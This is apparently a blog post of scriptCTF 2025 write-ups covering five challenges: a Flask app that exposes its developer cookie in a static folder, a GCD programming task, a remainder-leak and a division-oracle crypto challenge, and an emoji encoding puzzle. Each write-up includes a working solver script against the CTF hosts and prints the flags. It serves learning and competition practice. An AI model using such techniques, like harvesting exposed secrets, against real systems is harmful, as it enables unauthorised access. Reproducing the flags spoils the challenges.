---
title: scriptCTF2025 - Writeups
date: 2025-08-19 03:07:41 +0300
categories: [CTF Writeups]
tags: ScriptCTF, ctf, writeup]
img_path: /assets/img/final_logo.png
image:
  path: /assets/img/final_logo.png
---

# Renderer – Web Challenge (100 pts)
## Challenge Description
> Introducing Renderer! A free-to-use app to render your images!  

We are given a Flask application source code and asked to retrieve the flag.  

---

## Source Code Analysis
Relevant code snippet:

```python
@app.route('/developer')
def developer():
    cookie = request.cookies.get("developer_secret_cookie")
    correct = open('./static/uploads/secrets/secret_cookie.txt').read()
    if correct == '':
        c = open('./static/uploads/secrets/secret_cookie.txt','w')
        c.write(sha256(os.urandom(16)).hexdigest())
        c.close()
    correct = open('./static/uploads/secrets/secret_cookie.txt').read()
    if cookie == correct:
        c = open('./static/uploads/secrets/secret_cookie.txt','w')
        c.write(sha256(os.urandom(16)).hexdigest())
        c.close()
        return f"Welcome! There is currently 1 unread message: {open('flag.txt').read()}"
    else:
        return "You are not a developer!"
```

---

## 📌 Observations
- The `/developer` route checks for a cookie named **`developer_secret_cookie`**.  
- The valid cookie value is stored in **`./static/uploads/secrets/secret_cookie.txt`**.  
- Flask serves the `static/` folder publicly, so this file can be retrieved directly.  
- By sending the correct cookie value to `/developer`, the application will disclose the flag from `flag.txt`.  

---

## Exploitation
```python
import requests
base_url = "http://play.scriptsorcerers.xyz:10374"
# Step 1: Retrieve the secret cookie value
secret_cookie_url = f"{base_url}/static/uploads/secrets/secret_cookie.txt"
resp = requests.get(secret_cookie_url)
secret_cookie = resp.text.strip()
print(f"[+] Retrieved secret cookie: {secret_cookie}")

# Step 2: Use it in a request to /developer
cookies = {"developer_secret_cookie": secret_cookie}
developer_url = f"{base_url}/developer"
resp = requests.get(developer_url, cookies=cookies)

print("[+] Response from server:")
print(resp.text)
```
{: file="solve_Renderer.py" }


---

*Flag:* `scriptCTF{my_c00k135_4r3_n0t_s4f3!_a10e88abbb71}`
--



# More Divisors (Programming, 425 pts)
- **CTF:** ScriptCTF 2025  
- **Name:** More Divisors  
- **Category:** Programming  
- **Points:** 425  
- **Author:** Connor Chang  

---

## Challenge Description
Find the length of the longest subsequence of numbers (from a line sent by the server) such that the GCD of that subsequence is **greater than 1**. The server runs many rounds and sends a line containing many integers each round; you must reply the correct length every round. The challenge is interactive over TCP.

---

## Key idea / Observations
- A subsequence with GCD > 1 means all numbers in the subsequence share at least one common prime factor `p > 1`.
- Therefore, for each prime `p`, we can count how many numbers are divisible by `p`. The answer is the maximum count over all primes.
- Numbers `<= 1` can be ignored (they do not contribute).
- So the task reduces to factoring each number (or at least enumerating its distinct prime factors) and counting frequencies.

---

## Implementation (solve More Divisors)
```python
#!/usr/bin/env python3
import socket, re, time
from math import isqrt

HOST = 'play.scriptsorcerers.xyz'
PORT = 10133

def prime_factors(n):
    factors = set()
    if n % 2 == 0:
        factors.add(2)
        while n % 2 == 0:
            n //= 2
    f = 3
    while f * f <= n:
        if n % f == 0:
            factors.add(f)
            while n % f == 0:
                n //= f
        f += 2
    if n > 1:
        factors.add(n)
    return factors


def recv_some(s, timeout=5):
    s.settimeout(timeout)
    data = b''
    try:
        data = s.recv(32768)
    except socket.timeout:
        pass
    except Exception:
        pass
    return data.decode(errors='ignore')


def run():
    s = socket.socket()
    s.connect((HOST, PORT))
    print('connected')
    round_no = 0
    while True:
        line = ''
        while '\n' not in line:
            chunk = recv_some(s, timeout=5)
            if not chunk:
                break
            line += chunk
        if not line:
            print('no line received, connection may be closed')
            break

        # quick flag check
        if 'scriptCTF{' in line:
            m = re.search(r'scriptCTF{[^}]+}', line)
            if m:
                print('\nFLAG:', m.group(0))
                break

        nums = re.findall(r"\d+", line)
        if not nums:
            continue
        numbers = [int(x) for x in nums]
        round_no += 1

        # count distinct prime factors across all numbers
        prime_count = {}
        for v in numbers:
            if v <= 1:
                continue
            for p in prime_factors(v):
                prime_count[p] = prime_count.get(p, 0) + 1

        result = max(prime_count.values()) if prime_count else 0
        print(f'Round {round_no}: parsed {len(numbers)} numbers, sending {result}')
        s.send(f"{result}\n".encode())
        time.sleep(0.05)

if __name__ == '__main__':
    run()
```
{: file="solve_more_divisors.py" }

---




**Flag:** `scriptCTF{7H3_m0r3_f4C70r5_7h3_b3773r_a6419f2ce177}`
--


# Mod – Crypto Challenge (285 pts)
## Summary
**Mod 285** is a small cryptography/CTF challenge that leaks a secret via a remainder operation. The service accepts a user-supplied number, prints `num % secret`, then asks the user to guess the secret. This writeup explains the vulnerability, provides a proof-of-concept exploit, analyzes success conditions, and gives mitigation recommendations.

---

## Challenge description
The provided server-side script `chall.py` behaves as follows:

```python
#!/usr/local/bin/python3
import os
secret = int(os.urandom(32).hex(),16)
print("Welcome to Mod!")
num = int(input("Provide a number: "))
print(num % secret)
guess = int(input("Guess: "))
if guess == secret:
    print(open('flag.txt').read())
else:
    print("Incorrect!")
```

- `secret` is generated from 32 random bytes and treated as an integer (range `0 .. 2**256-1`).
- The program prints `num % secret` — the remainder of dividing the attacker-supplied `num` by the secret.
- If the attacker successfully guesses `secret`, the flag is revealed.

This direct remainder leak is the core vulnerability.

---

## Exploit idea
If we send a carefully chosen large `num` and read back the remainder `r`, we can sometimes recover `secret` by using the equation:

```
num = q * secret + r
```

If we choose `num` such that `q = 1` (i.e., `secret` is greater than `num/2` but less than or equal to `num`), then `secret = num - r`.

The example exploit uses `num = 2**256`. If the random `secret` happens to lie in `(2**255, 2**256]` (the upper half of 256-bit space), then sending `2**256` yields a quotient `q = 1`, and `secret = 2**256 - r`.

This makes a simple, single-request exploit viable roughly 50% of the time under a uniform random secret assumption.

---

## Proof-of-concept exploit
Below is the `solve.py` used to exploit the service remotely. It uses `pwntools` to connect, send `2**256`, parse the returned remainder, compute the secret, and submit it as the guess.

```python
from pwn import *

r = remote("play.scriptsorcerers.xyz", 10112)

# send a large number
num = 2**256
r.recvuntil(b"Provide a number: ")
r.sendline(str(num).encode())

# receive remainder
rem = int(r.recvline().strip())

# compute secret
secret = num - rem

# guess secret
r.recvuntil(b"Guess: ")
r.sendline(str(secret).encode())

# get flag
print(r.recvall().decode())
```

**Notes:** the script assumes the server prints the remainder as a single line and that the quotient `q` equals `1`.

---

**Flag:** `scriptCTF{-1_f0r_7h3_w1n_4a3f7db1_585246562a46}`
--

# Emoji — Writeup (misc, 100 pts)
## Summary
This challenge presents a long string of unusual emoji-like characters. The goal is to recover the hidden flag. The solution decodes each symbol's Unicode codepoint, extracts the low-order byte(s), concatenates them as hex, and interprets the result as ASCII — yielding the flag.

---

## Challenge data
- Title: `emoji`
- Attachments: `out.txt` — a sequence of emoji glyphs.
- Hints (implicit): unusual/rare emoji characters; likely an encoding trick.

Sample (abbreviated) from `out.txt`:

```
🁳🁣🁲🁩🁰🁴🁃🁔🁆🁻🀳🁭...
```

---

## Observations & reasoning
- The glyphs shown are in the Unicode block of enclosed CJK letters and other specialized symbols — not the common emoji such as 😀.
- Each visible character has a Unicode codepoint larger than the ASCII range (typically U+1Fxxx or similar).
- A common CTF trick is to encode data by taking some part of each Unicode codepoint (for example, the low byte) and using those bytes as hexadecimal digits or ASCII bytes.

Hypothesis: take the last two hex digits of each codepoint (the least-significant byte), join them, and decode from hex to ASCII.

---

## Solution (concise)
1. Read the emoji string from the attachment.
2. For each character, get its Unicode codepoint via `ord(char)` and convert to hex.
3. Extract the last two hex digits (low-order byte) and append to a running hex string.
4. Convert the final hex string to bytes and decode as ASCII/UTF-8.

This yields the flag.

---

## Example solver (Python)
```python
# read the emoji string (example taken from the challenge)
emoji_string = "🁳🁣🁲🁩🁰🁴🁃🁔🁆🁻🀳🁭🀰🁪🀱🁟🀳🁮🁣🀰🁤🀱🁮🁧🁟🀱🁳🁟🁷🀳🀱🁲🁤🁟🀴🁮🁤🁟🁦🁵🁮🀡🀱🁥🀴🀶🁤🁽"

hex_parts = []
for ch in emoji_string:
    hexf = hex(ord(ch))
    hex_parts.append(hexf[-2:])

hex_string = ''.join(hex_parts)
flag = bytes.fromhex(hex_string).decode()
print(flag)
```



**Flag:**
`scriptCTF{3m0j1_3nc0d1ng_1s_w31rd_4nd_fun!4e49b}
`
--
# Div 2 — Writeup (misc, 324 pts)
## Summary
This challenge gives an interactive program that holds a secret 128-bit integer `secret` (with its highest bit set). The service accepts two choices repeatedly: (1) provide a number `num` and the service prints `int(secret / num)`; (2) submit a guess for `secret`. The key observation is that by enforcing input numbers with the same bit-length as `secret`, each division result is either `0` or `1`. That yields a binary predicate which can be used to perform a binary search and recover `secret` deterministically within ~127 queries.

---

## Challenge description
Provided `chall.py` (trimmed):

```python
import secrets
import decimal
decimal.getcontext().prec = 50
secret = secrets.randbelow(1 << 127) + (1 << 127)  # 128-bit number
for _ in range(1000):
    print("[1] Provide a number\n[2] Guess the secret number")
    choice = int(input("Choice: "))
    if choice == 1:
        num = input('Enter a number: ')
        fl_num = decimal.Decimal(num)
        assert int(fl_num).bit_length() == secret.bit_length()
        div = secret / fl_num
        print(int(div))
    if choice == 2:
        guess = int(input("Enter secret number: "))
        if guess == secret:
            print(open('flag.txt').read().strip())
        else:
            print("Incorrect!")
        exit(0)
```

Important points:
- `secret` is a uniformly random 128-bit integer with top bit set (so `2**127 <= secret < 2**128`).
- On choice 1 the program reads `num` as a `decimal.Decimal` and asserts that its integer part has the **same bit_length** as `secret` (i.e. 128 bits). It then computes `div = secret / fl_num` (Decimal division) and prints `int(div)`.
- You can perform up to 1000 interactions.

---

## Exploit idea
Let `s = secret` and let `n` be an integer with `n.bit_length() == s.bit_length()`. Since both are 128-bit numbers with the same highest bit (i.e. `2**127 <= n, s < 2**128`), the value of `s / n` lies in the interval `(0, 2)`. Therefore `int(s/n)` is either `0` (when `n > s`) or `1` (when `n <= s`).

This gives us a binary predicate `P(n) = (int(s/n) >= 1)` which is equivalent to `n <= s`.

Hence we can run a classical binary search on the interval `[2**127, 2**128)` maintaining invariant `secret in [L, U)`:

- Query `mid = (L + U) // 2` (ensure it has 128 bits).
- If `int(s/mid) >= 1` the response is 1 ⇒ `mid <= secret` ⇒ set `L = mid`.
- Otherwise response is 0 ⇒ `mid > secret` ⇒ set `U = mid`.
- Repeat until `L + 1 == U` then `L` is the secret.

With 128-bit range this requires at most 127 queries. The service allows 1000 interactions, so this is easily achievable.

---

## Proof-of-concept exploit (Python)
Below is the working exploit used to recover the secret remotely (uses `pwntools`):

```python
from pwn import remote
import sys

HOST = "play.scriptsorcerers.xyz"
PORT = 10045

def query(r, x_str):
    r.recvuntil(b"Choice: ")
    r.sendline(b"1")
    r.recvuntil(b"Enter a number: ")
    r.sendline(x_str.encode())
    # read until we see a digits-only line and return it
    while True:
        line = r.recvline(timeout=5)
        if not line:
            raise EOFError("remote closed or no response")
        s = line.decode().strip()
        if s.isdigit():
            return int(s)

r = remote(HOST, PORT)
L = 1 << 127
U = 1 << 128
while L + 1 < U:
    mid = (L + U) // 2
    resp = query(r, str(mid))
    if resp >= 1:
        L = mid
    else:
        U = mid
    sys.stdout.write(f"\rsearching... L={L} U={U}      ")
    sys.stdout.flush()

print("\nFound candidate secret =", L)
# submit guess
r.recvuntil(b"Choice: ")
r.sendline(b"2")
r.recvuntil(b"Enter secret number: ")
r.sendline(str(L).encode())
print(r.recvall(timeout=5).decode(errors='ignore'))
```
---




**Flag:** `scriptCTF{b1n4ry_s34rch_u51ng_d1v1s10n?!!_6211d934b68}`
--



